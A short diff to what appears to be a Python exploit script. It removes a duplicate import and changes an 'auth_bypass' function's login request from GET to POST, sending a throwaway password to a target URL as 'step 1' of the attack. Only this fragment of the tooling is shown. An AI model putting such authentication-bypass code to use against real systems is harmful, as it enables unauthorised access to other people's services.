@@ -16,7 +16,6 @@ import sys
 import threading
 import requests
 import argparse
-import sys
 import urllib.parse
 from datetime import datetime
 import socket
@@ -187,7 +186,7 @@ def auth_bypass(session, target):
         "password": "anything",
     }
 
-    r = session.get(url, data=data, allow_redirects=False)
+    r = session.post(url, data=data, allow_redirects=False)
 
     log.info(f"[step 1] POST {url} -> {YELLOW}{r.status_code}{NC}")
     log.debug(f"[step 1] Response:\n {r.text[:200]}")
